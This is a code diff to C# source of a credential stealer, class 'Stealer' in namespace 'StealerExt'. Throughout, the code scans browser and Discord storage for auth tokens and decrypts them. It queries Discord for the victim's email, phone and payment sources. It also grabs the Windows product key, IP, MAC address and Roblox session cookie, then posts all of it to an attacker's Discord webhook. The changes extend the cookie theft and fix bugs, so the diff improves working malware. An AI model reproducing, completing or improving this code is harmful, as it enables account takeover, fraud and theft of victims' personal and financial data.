@@ -5,7 +5,6 @@ using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Management;
-using System.Net;
 using System.Net.NetworkInformation;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
@@ -15,10 +14,10 @@ namespace StealerExt
     internal class Stealer
 	{
 		public void StartSteal()
-		{
-			try
-			{
-				StealTokenFromChrome();
+        {
+            try
+            {
+                StealTokenFromChrome();
 				StealTokenFromOpera();
 				StealTokenFromOperaGX();
 				StealTokenFromEdge();
@@ -43,7 +42,7 @@ namespace StealerExt
 		}
 		private void TokenStealer(DirectoryInfo Folder, string Platform)
 		{
-			foreach (FileInfo file in Folder.GetFilesNew("*.ldb", "*.log", "*.sqlite"))
+			foreach (FileInfo file in Folder.GetFiles("*.ldb"))
 			{
 				string input = file.OpenText().ReadToEnd();
 				foreach (object obj in Regex.Matches(input, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}|dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
@@ -56,26 +55,54 @@ namespace StealerExt
 					else Task.FromResult(SaveTokensAsync(TokenCheckAccess(((Match)obj).Value), Platform));
 				}
 			}
+			foreach (FileInfo file in Folder.GetFiles("*.log"))
+			{
+				string input = file.OpenText().ReadToEnd();
+				foreach (object obj in Regex.Matches(input, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}|dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
+				{
+					if (Regex.IsMatch(((Match)obj).Value, @"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
+					{
+						string token = DecryptDiscordToken.Decrypt_Token(Convert.FromBase64String(((Match)obj).Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]), Folder.Parent.Parent.FullName + "\\Local State");
+						Task.FromResult(SaveTokensAsync(TokenCheckAccess(token), Platform));
+					}
+					else Task.FromResult(SaveTokensAsync(TokenCheckAccess(((Match)obj).Value), Platform));
+				}
+			}
+			foreach (FileInfo file in Folder.GetFiles("*.sqlite"))
+			{
+				string input = file.OpenText().ReadToEnd();
+				foreach (object obj in Regex.Matches(input, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}|dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
+				{
+					if (Regex.IsMatch(((Match)obj).Value, @"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
+					{
+						string token = DecryptDiscordToken.Decrypt_Token(Convert.FromBase64String(((Match)obj).Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]), Folder.Parent.Parent.FullName + "\\Local State");
+						Task.FromResult(SaveTokensAsync(TokenCheckAccess(token), Platform));
+					}
+					else Task.FromResult(SaveTokensAsync(TokenCheckAccess(((Match)obj).Value), Platform));
+				}
+			}
 		}
 		private string TokenCheckAccess(string token)
-		{
-			var http = new HttpUtils();
-            Dictionary<string, string> headers = new Dictionary<string, string>
+        {
+			Dictionary<string, string> headers = new Dictionary<string, string>
+			{
+				{ "Authorization", token },
+				{ "Content-Type", "application/json" }
+			};
+			try
+			{
+                _ = new HttpUtils().GetStringAsync("https://discordapp.com/api/v9/users/@me", headers).Result;
+			}
+			catch
             {
-                { "Authorization", token },
-                { "Content-Type", "application/json" }
-            };
-            string response = http.GetStringAsync("https://discordapp.com/api/v9/users/@me/guilds", headers).Result;
-            if (response.Contains("401: Unauthorized") || response.Contains("You need to verify your account in order to perform this action."))
-            {
-                token = "";
+				token = "";
             }
             return token;
 		}
 
 		private Task SaveTokensAsync(string token, string Platform)
         {
-            if (SavedTokens.Count > 0 && !string.IsNullOrEmpty(token))
+            if (SavedTokens.Count <= 0 && !string.IsNullOrEmpty(token))
 			{
 				var (_tokenInfo, payment, FailedPaymentInfo) = GetTokenInfo(token);
 				ManagementObjectSearcher mos = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
@@ -92,6 +119,7 @@ namespace StealerExt
                     embed.AddField("Windows Version:", OSName, true);
                     embed.AddField("Product Key:", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
                     embed.AddField("Mac Address:", NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)?.GetPhysicalAddress().ToString(), true);
+					embed.AddField("Roblox Cookie", $"```{StealCookieFromRoblox()}```");
 					InitiateEmbed(token, Platform, _tokenInfo, payment, FailedPaymentInfo, embed);
                 }
                 catch
@@ -104,9 +132,10 @@ namespace StealerExt
 						embed.AddField("Windows Version:", OSName, true);
 						embed.AddField("Product Key:", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
 						embed.AddField("Mac Address:", NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)?.GetPhysicalAddress().ToString(), true);
+						embed.AddField("Roblox Cookie", $"```{StealCookieFromRoblox()}```");
 						embed.AddField("__Token Info__", $"Username | {_tokenInfo.username}#{_tokenInfo.discriminator}\nID | {_tokenInfo.id}\nNitro | {_tokenInfo.premium_type}\nEmail | {_tokenInfo.email}\nPhone | {_tokenInfo.phone}\nVerified | {_tokenInfo.verified}\nMFA | {_tokenInfo.mfa_enabled}\nLanguage | {_tokenInfo.locale}\nFlags | {_tokenInfo.flags}\n{Platform} Token | ||{token}||");
 						embed.AddField("__Payment Info__", "Has Payment | Unknown\nFailed to parse other info [Might be invalid card(s)]");
-						embed.SendEmbed().RunSynchronously();
+						embed.SendEmbed();
 					}
 					catch (Exception x)
 					{
@@ -133,7 +162,7 @@ namespace StealerExt
                         embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
                         embed.AddField("__Token Info__", $"Username | {_tokenInfo.username}#{_tokenInfo.discriminator}\nID | {_tokenInfo.id}\nNitro | {_tokenInfo.premium_type}\nEmail | {_tokenInfo.email}\nPhone | {_tokenInfo.phone}\nVerified | {_tokenInfo.verified}\nMFA | {_tokenInfo.mfa_enabled}\nLanguage | {_tokenInfo.locale}\nFlags | {_tokenInfo.flags}\n{Platform} Token | ||{token}||");
                         embed.AddField("__Payment Info__", "Has payment | Unknown\nFailed to parse other info [Might be invalid card(s)]");
-						embed.SendEmbed().RunSynchronously();
+						embed.SendEmbed();
 					}
                     catch (Exception x)
                     {
@@ -161,25 +190,24 @@ namespace StealerExt
             {
                 embed.AddField("__Payment Info__", "Has Payment | Yes\nFailed to parse other info");
             }
-            else embed.AddField("__Payment Info__", "Payment: He is poor (No payment)");
-			embed.AddField("__Roblox Cookie__", $"```{StealCookieFromRoblox()}```");
-			embed.SendEmbed().RunSynchronously();
-        }
+            else embed.AddField("__Payment Info__", "Payment: He is poor (empty account)");
+			embed.SendEmbed();
+		}
 
         private (dynamic _tokenInfo, dynamic payment, bool FailedPaymentInfo) GetTokenInfo(string token)
         {
             Dictionary<string, string> headers = new Dictionary<string, string>
-                {
-                    { "Authorization", token }
-                };
-            var request = new HttpUtils();
-			dynamic _tokenInfo = JsonConvert.DeserializeObject(request.GetStringAsync("https://discordapp.com/api/v8/users/@me", headers).Result);
-            switch ((int)_tokenInfo.premium_type)
             {
-                case 1:
+                { "Authorization", token }
+            };
+            var request = new HttpUtils();
+			dynamic _tokenInfo = JsonConvert.DeserializeObject(request.GetStringAsync("https://discordapp.com/api/v9/users/@me", headers).Result);
+            switch ((string)_tokenInfo.premium_type)
+            {
+                case "1":
                     _tokenInfo.premium_type = "Nitro Classic [$4.99/$49.99]";
                     break;
-                case 2:
+                case "2":
                     _tokenInfo.premium_type = "Nitro [$9.99/$99]";
                     break;
                 default:
@@ -194,11 +222,9 @@ namespace StealerExt
             bool FailedPaymentInfo = false;
             try
             {
-				payment = JsonConvert.DeserializeObject(request.GetStringAsync("https://discord.com/api/v9/users/@me/billing/payment-sources", headers).Result
-					.Replace("[", "")
-					.Replace("]", ""));
-            }
-            catch
+				payment = JsonConvert.DeserializeObject(new HttpUtils().GetStringAsync("https://discord.com/api/v9/users/@me/billing/payment-sources", headers).Result);
+			}
+			catch
             {
                 FailedPaymentInfo = true;
             }
@@ -213,14 +239,15 @@ namespace StealerExt
 			{
 				OSName = managementObject["Caption"].ToString();
 			}
-			string IP = new WebClient().DownloadString("https://ipecho.net/plain");
 			var embed = new DiscordWebhook(Hook);
 			embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
-			embed.AddField("IP:", IP, true);
+			embed.AddField("IP:", new HttpUtils().GetStringAsync("https://ipecho.net/plain").Result, true);
 			embed.AddField("Windows Version:", OSName, true);
 			embed.AddField("Product Key", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
+			embed.AddField("Mac Address:", NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)?.GetPhysicalAddress().ToString(), true);
+			embed.AddField("Roblox Cookie", $"```{StealCookieFromRoblox()}```");
 			embed.AddField("Token?", "No token was found due to recent password change or Discord not being found in any of the supported platforms!");
-			embed.SendEmbed().RunSynchronously();
+			embed.SendEmbed();
 		}
 
 		private void StealTokenFromDiscordApp()
@@ -348,6 +375,7 @@ namespace StealerExt
             {
 				using (var reg = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com", false))
 				{
+                    if (reg == null) return "Roblox Studio cookie not found";
 					return reg.GetValue(".ROBLOSECURITY").ToString().Substring(46).Trim('>');
 				}
 			}
